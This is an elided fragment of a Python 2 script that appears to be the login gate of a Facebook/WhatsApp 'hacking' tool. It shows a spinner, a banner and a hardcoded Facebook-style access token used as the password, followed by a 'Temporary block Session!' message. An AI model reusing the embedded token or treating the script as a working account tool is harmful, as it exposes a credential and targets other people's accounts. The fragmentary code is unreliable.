...
def tik():
        titik = ['.   ','..  ','... ','.   ','..  ','... ']
        for o in titik:
                print('\r\033[1;97m[\033[1;92m+\033[1;97m]Loging In '+o),;sys.stdout.flush();time.sleep(1)
os.system("clear")
os.system('toilet -f big ✯S O M I✯ -F gay')
print  """

"""
Token = 'EAAAAUaZA8jlABABJtMMCxyMug5PkVeNy45vSV8gS48SvILqGTtIiZA1UmKsrbs2mJV3l6JjNcfSGGFX'
...
while loop == 'true':
    ...
    if username == Token:
    	...
    	tik()
        print
        print 'Temporary block Session!'
        print '\033[1;94mFace\033[1;97mbook \033[1;92m Whats\033[1;97mApp  '
        tik()
